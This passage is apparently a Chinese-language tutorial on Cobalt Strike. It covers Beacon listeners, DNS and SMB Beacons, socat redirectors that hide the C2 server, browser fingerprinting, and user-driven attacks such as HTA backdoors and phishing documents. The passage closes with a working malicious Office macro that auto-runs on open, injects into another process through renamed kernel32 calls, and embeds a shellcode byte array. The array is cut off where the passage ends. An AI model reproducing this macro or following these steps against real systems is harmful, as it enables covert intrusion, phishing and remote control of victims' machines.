是一个小程序，通常是手工优化的汇编指令，用于下载一个payload stage、把它注入内存，然后对其传达执行命令。这个过程被称为 staging（分阶段）。<br>staging（分阶段）过程在一些攻击行动中是必要的。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透payload。Cobalt Strike 在它的用户驱动攻击中使用 staging（分阶段）。大多数这类项目Attacks → Packages 和 Attacks → Web Drive-by 选项下。使用什么样的 stager 取决于与攻击配对的 payload。比如，HTTP Beacon 有一个 HTTP stager。DNS Beacon 有一个 DNS TXT 记录 stager。不是所有的 payload 都有 stager 选项。</p><p>没有 stager 的 Payload 不能使用这些攻击选项投递。如果你不需要 payload staging（分阶段），通过在你的 C2 拓展文件里把 host_stage 选项设为false，你可以关闭这个选项。这会阻止 Cobalt Strike 在其 web 和 DNS 服务器上托管 payloadstage。这种设置有助于提升行为安全（避免反溯源），因为如果开启了 staging（分阶段），任何人都能连到你的服务器上，请求一个 payload、并分析它的内容，从而可以从你的 payload 配置中获取信息。  </p><p><strong>创建监听器</strong></p><p>要管理 Cobalt Strike 的监听器，通过 Cobalt Strike → Listeners 。这会打开一个标签页，列举出所有你的配置的 payload 和监听器。  </p><p>在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p><p>Cobalt Strike有两种类型的监听器：</p><ul><li>Beacon</li></ul><p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><ul><li>Foreign</li></ul><p>Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/foreign/reverse_https</span><br></pre></td></tr></table></figure><h3 id="2-2-HTTP-Beacon和HTTPS-Beacon"><a href="#2-2-HTTP-Beacon和HTTPS-Beacon" class="headerlink" title="2.2 HTTP Beacon和HTTPS Beacon"></a>2.2 HTTP Beacon和HTTPS Beacon</h3><p><strong>Beacon是什么</strong></p><ul><li>Beacon是CS的Payload</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li><li>Beacon有很多的后渗透攻击模块和远程管理工具</li></ul><p><strong>Beacon的类型</strong></p><ul><li>HTTP 和 HTTPS Beacon</li></ul><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure><ul><li>DNS Beacon</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br></pre></td></tr></table></figure><ul><li>SMB Beacon</li></ul><p>SMB Beacon也可以叫做pipe beacon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_smb/bind_pipe</span><br></pre></td></tr></table></figure><p><strong>创建一个HTTP Beacon</strong></p><p>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p><p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch。基础篇有详细步骤介绍。</p><p><strong>HTTPS Beacon</strong></p><p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h3 id="2-3-DNS-Beacon"><a href="#2-3-DNS-Beacon" class="headerlink" title="2.3 DNS Beacon"></a>2.3 DNS Beacon</h3><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p><p>DNS Beacon的工作流程具体如下：</p><p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器stager嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器stager回连下载CS服务器上的DNS Beacon传输体stage，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p><p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p><p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p><p><strong>域名配置</strong></p><p>既然是配置域名，所以就需要先有个域名，这里就用一个博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/6.png"></p><p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/7.png"></p><p>根据基础篇的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/8.png"></p><p>然后经过一段时间的等待，就可以发现已经上线了</p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/9.png" style="zoom:50%;"><h3 id="2-4-SMB-Beacon"><a href="#2-4-SMB-Beacon" class="headerlink" title="2.4 SMB Beacon"></a>2.4 SMB Beacon</h3><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/10.png" style="zoom:67%;"><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效（系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败）.</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p>SMB Beacon 配置</p><p>首先需要一个上线的主机，这里我使用的HTTP Beacon，主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/11.png"></p><p>接下来在Beacon中直接输入spawn SMB，这里的SMB指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/12.png"></p><p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/13.png"></p><p>接下来我这里将SMB Beacon插入到进程中，以firefox进程为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/14.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/15.png"></p><p>在firefox中插入SMB Beacon后，便能看到process为firefox的派生SMB Beacon。</p><p>在CS中，如果获取到目标的管理员权限，在用户名后会有*号标注。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/16.png"></p><p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/17.png"></p><h3 id="2-5-重定向器"><a href="#2-5-重定向器" class="headerlink" title="2.5 重定向器"></a>2.5 重定向器</h3><p>重定向器Redirectors是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标靶机 &lt;--------&gt; 多个并列的重定向器 &lt;------&gt; CS服务器</span><br></pre></td></tr></table></figure><p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p><ul><li>保护自己的CS服务器，避免目标发现自己的真实IP</li><li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li></ul><p>Cobalt Strike 的监听器管理功能支持使用重定向器。当你设置一个 HTTP 或 HTTPS Beacon 监听器的时候，简单的指定你的重定向器 IP （在 Host 字段填入）。</p><p>Cobalt Strike 不会验证这个信息。如果你提供的 host 不隶属于当前主机（不是团队服务器的 IP），那么 Cobalt Strike 就假设它是重定向器。一种把服务器转变为重定向器的简单方法是使用 socat。</p><p><strong>创建一个重定向器</strong></p><p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p><p>CS服务器IP：10.251.0.35</p><p>目标靶机IP：10.251.0.29</p><p>重定向器IP：10.251.0.33 10.251.0.36</p><p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：下面是一句 socat 语法，作用是：将80端口上的所有连接转发到位于192.168.12.100的团队服务器的80端口：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:10.251.0.35:80</span><br></pre></td></tr></table></figure><p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/18.png"></p><h3 id="2-6-攻击载荷安全特性"><a href="#2-6-攻击载荷安全特性" class="headerlink" title="2.6 攻击载荷安全特性"></a>2.6 攻击载荷安全特性</h3><ul><li><p>在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p></li><li><p>在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p></li><li><p>当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p></li><li><p>值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p></li></ul><h2 id="3-目标攻击"><a href="#3-目标攻击" class="headerlink" title="3.目标攻击"></a>3.目标攻击</h2><h3 id="3-1-客户端攻击"><a href="#3-1-客户端攻击" class="headerlink" title="3.1 客户端攻击"></a>3.1 客户端攻击</h3><p><strong>什么是客户端攻击</strong></p><p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p><p>原文：A client-side attack is an attack against an application used to view attacker controlled content.</p><p><strong>为什么要进行客户端攻击</strong></p><p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p><p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p><p><strong>如何获得客户端上的立足点</strong></p><p>1、尽可能多的了解目标环境，即做好信息收集工作</p><p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p><p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p><p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p><p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p><p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p><h3 id="3-2-系统侦察-System-Profiler"><a href="#3-2-系统侦察-System-Profiler" class="headerlink" title="3.2 系统侦察 System Profiler"></a>3.2 系统侦察 System Profiler</h3><p>系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。</p><p>如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/19.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p><p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h3 id="3-3-用户驱动攻击"><a href="#3-3-用户驱动攻击" class="headerlink" title="3.3 用户驱动攻击"></a>3.3 用户驱动攻击</h3><p>用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。</p><p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p><p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p><p><strong>用户驱动攻击包</strong></p><p>用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks –&gt; Packages</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/24.png"></p><p>1、HTML应用</p><p>HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。</p><p>2、Microsoft Office 宏文件</p><p>Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。</p><p>3、Payload 生成器</p><p>Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。</p><p>4、Windows 可执行文件</p><p>Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p><p>5、Windows 可执行文件（Stageless）</p><p>Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p><h4 id="3-3-1-hta后门"><a href="#3-3-1-hta后门" class="headerlink" title="3.3.1 hta后门"></a>3.3.1 hta后门</h4><p>首先来到Attacks –&gt; Packages –&gt; HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。选择监听器，通过Generate生成。注意：这里需要使用powershell的方式生成hat文件，否则会报错。选择保存的路径即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/26.png"></p><p>HTML应用文件生成好后，来到Attacks –&gt; Web Drive-by –&gt; Host File，选择刚才生成的文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/27.png"></p><p>最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/28.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/29.png"></p><p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/30.png"></p><h4 id="3-3-2-宏病毒"><a href="#3-3-2-宏病毒" class="headerlink" title="3.3.2 宏病毒"></a>3.3.2 宏病毒</h4><p>点击Attacks–&gt;Packages–&gt;MS Office Macro。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/31.png"></p><p>然后选择一个监听器，点击Generate，然后点击Copy Macro。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/32.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,92,17,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,53,70,121,104,0,50,80,97,95,22,41,93,72,-68,23,25,-79,21,-58,45,-39,-82,48,-100,-118,-68,73,-49,-85,68,0,-113,-101,120,89,-123,63, _</span><br><span 